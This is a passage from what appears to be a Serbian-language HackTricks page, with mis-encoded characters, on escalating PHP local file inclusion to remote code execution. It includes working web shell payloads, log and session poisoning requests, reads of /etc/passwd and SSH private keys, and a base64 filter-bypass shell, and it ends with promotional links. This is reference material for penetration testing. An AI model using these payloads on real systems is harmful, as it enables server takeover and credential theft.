Kao log fajl, poÅ¡aljite payload u User-Agent, biÄ‡e reflektovan unutar fajla /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Preko otpremanja

Ako moÅ¾ete otpremiti datoteku, jednostavno ubacite shell payload u nju (npr. `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Da biste odrÅ¾ali Äitljivost datoteke, najbolje je ubaciti u metapodatke slika/doc/pdf

### Putem otpremanja ZIP datoteke

Otpremite ZIP datoteku koja sadrÅ¾i komprimiranu PHP ljusku i pristupite:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Putem PHP sesija

Proverite da li veb sajt koristi PHP sesije (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
U PHP-u, ove sesije se Äuvaju u datotekama _/var/lib/php5/sess\\_\[PHPSESSID]\_.
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Postavite kolaÄiÄ‡ na `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Koristite LFI da biste ukljuÄili PHP sesijski fajl
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Preko ssh-a

Ako je ssh aktivan, proverite koji se korisnik koristi (/proc/self/status & /etc/passwd) i pokuÅ¡ajte pristupiti **\<HOME>/.ssh/id\_rsa**

### **Preko** **vsftpd** _**logova**_

Logovi za FTP server vsftpd nalaze se na **_/var/log/vsftpd.log_**. U scenariju gde postoji ranjivost lokalnog ukljuÄivanja datoteka (LFI) i moguÄ‡ pristup izloÅ¾enom vsftpd serveru, mogu se razmotriti sledeÄ‡i koraci:

1. Ubacite PHP payload u polje za korisniÄko ime tokom procesa prijave.
2. Nakon ubacivanja, koristite LFI da biste dobili logove servera sa **_/var/log/vsftpd.log_**.


### Preko php base64 filtera (koriÅ¡Ä‡enjem base64)

Kao Å¡to je prikazano u [ovom](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) Älanku, PHP base64 filter jednostavno ignoriÅ¡e Non-base64. MoÅ¾ete to koristiti da biste zaobiÅ¡li proveru ekstenzije datoteke: ako dostavite base64 koji se zavrÅ¡ava sa ".php", on Ä‡e jednostavno ignorisati "." i dodati "php" na base64. Evo primera payloada:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Putem PHP filtera (nije potreban fajl)

Ovaj [**Älanak**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) objaÅ¡njava da moÅ¾ete koristiti **PHP filtere za generisanje proizvoljnog sadrÅ¾aja** kao izlaz. To znaÄi da moÅ¾ete **generisati proizvoljni PHP kod** za ukljuÄivanje **bez potrebe da ga piÅ¡ete** u fajl.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Putem greÅ¡ke segmentacije

**Postavite** fajl koji Ä‡e biti smeÅ¡ten kao **privremeni** u `/tmp`, zatim u **istom zahtevu**, izazovite **greÅ¡ku segmentacije**, i tada **privremeni fajl neÄ‡e biti obrisan** i moÅ¾ete ga pronaÄ‡i.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Putem Nginx privremenog skladiÅ¡tenja fajlova

Ako ste pronaÅ¡li **Lokalno ukljuÄivanje fajlova** i **Nginx** je pokrenut ispred PHP-a, moÅ¾da Ä‡ete moÄ‡i da dobijete RCE pomoÄ‡u sledeÄ‡e tehnike:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### Putem PHP\_SESSION\_UPLOAD\_PROGRESS

Ako ste pronaÅ¡li **Lokalno ukljuÄivanje fajlova**, Äak i ako **nemate sesiju** i `session.auto_start` je `Off`. Ako pruÅ¾ite **`PHP_SESSION_UPLOAD_PROGRESS`** u **multipart POST** podacima, PHP Ä‡e **omoguÄ‡iti sesiju za vas**. MoÅ¾ete zloupotrebiti ovo da biste dobili RCE:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Putem privremenog otpremanja fajlova u Windows-u

Ako ste pronaÅ¡li **Lokalno ukljuÄivanje fajlova** i server radi na **Windows-u**, moÅ¾ete dobiti RCE:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### Putem phpinfo() (file\_uploads = on)

Ako ste pronaÅ¡li **Lokalno ukljuÄivanje fajlova** i fajl koji prikazuje **phpinfo()** sa file\_uploads = on, moÅ¾ete dobiti RCE:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### Putem compress.zlib + `PHP_STREAM_PREFER_STUDIO` + otkrivanje putanje

Ako ste pronaÅ¡li **Lokalno ukljuÄivanje fajlova** i moÅ¾ete **izvuÄ‡i putanju** privremenog fajla, ALI **server** proverava da li **fajl koji treba da se ukljuÄi ima PHP oznake**, moÅ¾ete pokuÅ¡ati da **zaobiÄ‘ete tu proveru** sa ovom **trkom stanja**:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### Putem veÄnog Äekanja + brute force

Ako moÅ¾ete zloupotrebiti LFI da biste **otpustili privremene fajlove** i naterali server da **zastane** izvrÅ¡avanje PHP-a, tada moÅ¾ete **brute force-ovati imena fajlova satima** da biste pronaÅ¡li privremeni fajl:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### Do Fatalne greÅ¡ke

Ako ukljuÄite bilo koji od fajlova `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Morate ukljuÄiti isti fajl 2 puta da biste izazvali tu greÅ¡ku).

**Ne znam kako je ovo korisno, ali moÅ¾e biti.**\
_ÄŒak i ako izazovete PHP Fatalnu greÅ¡ku, privremeni fajlovi PHP-a koji su otpremljeni Ä‡e biti obrisani._

<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

## Reference

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

PridruÅ¾ite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!

**Hacking Insights**\
UkljuÄite se u sadrÅ¾aj koji istraÅ¾uje uzbuÄ‘enje i izazove hakovanja

**Vesti o hakovanju u realnom vremenu**\
Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu

**Najnovije objave**\
Budite informisani o najnovijim pokretanjima nagrada za pronalaÅ¾enje bagova i vaÅ¾nim aÅ¾uriranjima platforme

**PridruÅ¾ite nam se na** [**Discord-u**](https://discord.com/invite/N3FrSbmwdy) i poÄnite da saraÄ‘ujete sa vrhunskim hakerima danas!

<details>

<summary><strong>NauÄite hakovanje AWS-a od poÄetka do naprednog nivoa sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **oglaÅ¡avanje vaÅ¡e kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, pogledajte [**PLANOVE ZA PRIJEM**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje trikove hakovanja slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
